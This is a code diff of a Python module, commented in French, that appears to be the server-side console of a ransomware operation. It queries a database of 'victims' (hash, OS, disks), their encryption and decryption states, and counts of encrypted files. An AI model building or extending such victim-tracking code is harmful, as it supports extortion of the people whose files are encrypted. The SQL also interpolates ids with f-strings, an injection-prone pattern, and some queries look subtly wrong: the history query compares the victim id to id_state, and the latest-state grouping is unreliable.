@@ -52,19 +52,64 @@ def get_list_victims(conn):
     :param conn: la connexion déjà établie à la base de donnée
     :return: La liste des victimes
     """
-    select = f'SELECT * FROM victims '
+    query = '''
+    SELECT victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state  
+    FROM (SELECT id_victim, MAX(datetime), state AS last_state
+    FROM states
+    GROUP BY id_victim) AS last_states
+    INNER JOIN victims ON victims.id_victim = last_states.id_victim
+        '''
+    victims = select_data(conn, query)  # victims[n][victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state ]
 
-    list_victim = select_data(conn, select)
-    return list_victim
+    # victims_list contient la liste de toutes les victimes (id_victim, hash, os, disks, state, nb_files)
+    i = 0
+    victims_list = []
+    for victim in victims:
+        victims_list.append(list(victim))
+        if victim[4] == 'CRYPT' or victim[4] == 'PENDING':
+            query = f'''
+                SELECT encrypted.nb_files
+            FROM encrypted
+            WHERE encrypted.id_victim = {victim[0]}
+              AND encrypted.datetime = (SELECT MAX(datetime) 
+                                          FROM encrypted 
+                                         WHERE id_victim = {victim[0]})
+                '''
+            nb_files = select_data(conn, query)
+            if nb_files:
+                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
+            else:
+                nb_files = 0
+            victims_list[i].append(nb_files)  # ajout du dernier nb_files encrypted
+        elif victim[4] == 'DECRYPT' or victim[4] == 'PROTECTED':
+            query = f'''
+                 SELECT decrypted.nb_files
+            FROM decrypted
+            WHERE decrypted.id_victim = {victim[0]}
+              AND decrypted.datetime = (SELECT MAX(datetime) 
+                                          FROM decrypted 
+                                         WHERE id_victim = {victim[0]})
+                '''
+            nb_files = select_data(conn, query)
+            if nb_files:
+                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
+            else:
+                nb_files = 0
+            victims_list[i].append(nb_files)  # ajout du dernier nb_files decrypted
+        else:
+            victims_list[i].append(0)  # ajout du 0 pour le cas INITIALIZE
+        i += 1
+
+    return victims_list
 
 
-def get_list_history(conn):
+def get_list_history(conn,id_victim):
     """
     Retourne l'historique correspondant à la victime 'id_victim'
     :param conn: la connexion déjà établie à la base de donnée
     :param id_victim: l'identifiant de la victime
     :return: la liste de son historique
     """
-    select = f' SELECT * from states'
+    select = f' SELECT id_state from states WHERE {id_victim} = id_state'
     list_history = select_data(conn, select)
     return list_history
